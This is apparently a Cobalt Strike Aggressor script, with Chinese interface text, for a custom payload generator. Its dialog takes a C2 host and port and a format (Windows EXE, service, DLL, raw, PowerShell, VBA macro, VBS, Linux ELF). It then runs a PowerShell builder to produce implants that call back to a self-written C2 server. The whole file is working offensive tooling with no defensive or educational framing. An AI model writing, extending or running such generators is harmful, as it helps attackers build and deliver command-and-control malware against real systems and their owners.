# ---------------------------------------------------------------- Payload 生成器
sub csdev_gen_dialog {
    local('$dialog');

    $dialog = dialog("自研 Payload 生成器",
        %(fmt => "win-exe", host => "", port => "8443", ssl => "off", out => "D:/payload_out/payload.exe"),
        &csdev_gen_go);

    dialog_description($dialog, "全部格式均为自研实现, 不含 CS 任何组件; 回连自研服务端 c2/server.py");

    drow_combobox($dialog, "fmt", "格式: ",
        @("win-exe","win-console","win-svc","win-dll","win-raw",
          "win-ps1","win-vba","win-vbs","linux-elf","linux-elf-dyn"));
    drow_text($dialog, "host", "C2 地址: ");
    drow_text($dialog, "port", "C2 端口: ");
    drow_combobox($dialog, "ssl", "协议: ", @("off", "on"));
    drow_text($dialog, "out",  "输出文件: ");
    dbutton_action($dialog, "生成");
    dialog_show($dialog);
}

sub csdev_gen_go {
    local('$f $h $p $s $o $cmd');

    $f = $3['fmt'];
    $h = $3['host'];
    $p = $3['port'];
    $s = $3['ssl'];
    $o = $3['out'];

    if ($h eq "") { show_error("C2 地址不能为空"); return; }
    if ($o eq "") { $o = "D:/payload_out/payload.exe"; }

    $cmd = csdev_ps(csdev_tool("gen_payload.ps1"))
         . " -Format " . $f . " -Host_ \"" . $h . "\" -Port " . $p . " -OutFile \"" . $o . "\"";
    if ($s eq "on") { $cmd .= " -Ssl"; }

    println("\c9[cs_dev]\c7 生成 \cF" . $f . "\c7 -> " . $h . ":" . $p);
    exec($cmd);

    show_message(csdev_head("Payload 生成") . "\n\n" .
        " 格式 " . $f . "\n" .
        " 回连 " . $h . ":" . $p . "\n" .
        " 输出 " . $o . "\n\n" .
        csdev_rule() . "\n" .
        " win-exe / win-console / win-svc / win-dll\n" .
        " win-raw / win-ps1 / win-vba / win-vbs\n" .
        " linux-elf / linux-elf-dyn\n\n" .
        " 服务端 python c2/server.py --port " . $p . "\n" .
        " 控制台 python c2/gui.py");
}

